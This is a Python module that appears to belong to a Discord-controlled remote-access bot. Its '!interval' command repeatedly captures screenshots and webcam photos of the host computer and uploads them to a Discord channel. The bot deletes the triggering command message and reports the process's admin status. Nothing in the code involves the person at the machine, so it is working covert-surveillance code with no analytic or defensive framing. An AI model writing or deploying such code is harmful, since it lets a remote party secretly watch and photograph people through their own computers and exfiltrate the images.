import os
import discord
import datetime
import asyncio
from utils.capture_utils import capture_screenshot_fallback, capture_photo_fallback, is_admin

# Global interval task reference & status dictionary
_interval_task = None
_interval_info = {
    "active": False,
    "target": None,
    "number": None,
    "unit": None,
    "interval_seconds": None,
    "started_at": None,
    "channel_id": None
}

INTERVAL_SS_PATH = os.path.join("data", "interval_ss.png")
INTERVAL_PHOTO_PATH = os.path.join("data", "interval_photo.jpg")


def stop_interval_task():
    """Stops any currently running periodic capture task."""
    global _interval_task, _interval_info
    if _interval_task and not _interval_task.done():
        _interval_task.cancel()
        _interval_task = None
    _interval_info["active"] = False


async def _interval_worker(channel, target: str, interval_seconds: float):
    """Background worker loop that periodically takes and sends captures."""
    try:
        while True:
            await asyncio.sleep(interval_seconds)
            time_str = datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")

            if target in ("ss", "screenshot", "both"):
                success, res_path_or_err, method = await asyncio.to_thread(capture_screenshot_fallback, INTERVAL_SS_PATH)
                if success:
                    caption = f"⏱️ **[Periodic Screenshot]** Taken at {time_str} ({method})"
                    await channel.send(caption, file=discord.File(res_path_or_err))
                    print(f"[interval_LOG] Screenshot sent at {time_str}")
                else:
                    await channel.send(f"⚠️ **[Periodic Screenshot Error]** {res_path_or_err}")

            if target in ("photo", "webcam", "both"):
                success, res_path_or_err, method = await asyncio.to_thread(capture_photo_fallback, INTERVAL_PHOTO_PATH)
                if success:
                    caption = f"⏱️ **[Periodic Photo]** Taken at {time_str} ({method})"
                    await channel.send(caption, file=discord.File(res_path_or_err))
                    print(f"[interval_LOG] Photo sent at {time_str}")
                else:
                    await channel.send(f"⚠️ **[Periodic Photo Error]** {res_path_or_err}")

    except asyncio.CancelledError:
        print("[interval_LOG] Interval task cancelled.")
    except Exception as e:
        print(f"[interval_LOG] Unexpected error in interval worker: {e}")
        try:
            await channel.send(f"⚠️ Interval capture task encountered an error: {e}")
        except Exception:
            pass


async def execute_interval_command(client, message, args, config=None):
    """
    Configures periodic screenshot & photo captures at specified time intervals.
    
    Usage:
    - !interval <ss|photo|both> <number> <s|m|h>
      (e.g., !interval ss 30 s | !interval photo 5 m | !interval both 1 h)
    - !interval stop (or !interval off)
    - !interval status
    """
    global _interval_task, _interval_info

    try:
        await message.delete()
    except Exception:
        pass

    if not args:
        embed = discord.Embed(
            title="⏱️ Periodic Capture Command Usage",
            description=(
                "**Start Capture Task:**\n"
                "`!interval <ss|photo|both> <number> <s|m|h>`\n"
                "Examples:\n"
                "- `!interval ss 30 s` (Screenshot every 30 seconds)\n"
                "- `!interval photo 5 m` (Webcam photo every 5 minutes)\n"
                "- `!interval both 1 h` (Both every 1 hour)\n\n"
                "**Control Commands:**\n"
                "- `!interval stop` - Stop periodic capture\n"
                "- `!interval status` - Check current interval status"
            ),
            color=discord.Color.blue()
        )
        await message.channel.send(embed=embed)
        return

    subcommand = args[0].lower()

    if subcommand in ("stop", "off", "cancel", "disable"):
        if _interval_info["active"]:
            stop_interval_task()
            await message.channel.send("🛑 Periodic capture task has been stopped.")
        else:
            await message.channel.send("ℹ️ No active periodic capture task is currently running.")
        return

    if subcommand == "status":
        if _interval_info["active"]:
            admin_str = "Active" if is_admin() else "Standard User"
            embed = discord.Embed(
                title="⏱️ Periodic Capture Status",
                color=discord.Color.green()
            )
            embed.add_field(name="Status", value="🟢 Running", inline=True)
            embed.add_field(name="Target Type", value=_interval_info['target'].upper(), inline=True)
            embed.add_field(name="Interval", value=f"{_interval_info['number']} {_interval_info['unit']}", inline=True)
            embed.add_field(name="Started At", value=_interval_info['started_at'], inline=False)
            embed.add_field(name="Process Privileges", value=admin_str, inline=False)
            await message.channel.send(embed=embed)
        else:
            await message.channel.send("ℹ️ Periodic capture is currently **inactive**.")
        return

    # Parsing parameter format: <target> <number> <unit>
    if len(args) < 3:
        await message.channel.send(
            "⚠️ Invalid format. Usage: `!interval <ss|photo|both> <number> <s|m|h>`"
        )
        return

    target = args[0].lower()
    if target not in ("ss", "screenshot", "photo", "webcam", "both"):
        await message.channel.send("⚠️ Invalid capture target. Choose between `ss`, `photo`, or `both`.")
        return

    try:
        number = float(args[1])
        if number <= 0:
            raise ValueError("Interval must be positive")
    except ValueError:
        await message.channel.send("⚠️ Invalid number for interval duration. Must be a positive number.")
        return

    unit_raw = args[2].lower()
    if unit_raw in ("s", "sec", "secs", "second", "seconds"):
        unit = "seconds"
        multiplier = 1
    elif unit_raw in ("m", "min", "mins", "minute", "minutes"):
        unit = "minutes"
        multiplier = 60
    elif unit_raw in ("h", "hr", "hrs", "hour", "hours"):
        unit = "hours"
        multiplier = 3600
    else:
        await message.channel.send("⚠️ Invalid time unit. Use `s` (seconds), `m` (minutes), or `h` (hours).")
        return

    interval_seconds = number * multiplier

    # Stop any existing running task
    stop_interval_task()

    # Start new interval worker task
    now_str = datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    _interval_info = {
        "active": True,
        "target": target,
        "number": number,
        "unit": unit,
        "interval_seconds": interval_seconds,
        "started_at": now_str,
        "channel_id": message.channel.id
    }

    _interval_task = asyncio.create_task(_interval_worker(message.channel, target, interval_seconds))

    admin_notice = "" if is_admin() else " *(Note: Bot is running without Admin privileges)*"
    await message.channel.send(
        f"✅ **Periodic capture started!**\n"
        f"📸 Mode: **{target.upper()}** every **{number} {unit}**.{admin_notice}\n"
        f"Use `!interval stop` to halt periodic capture."
    )
    print(f"[interval_command_LOG] Started interval capture '{target}' every {number} {unit}.")
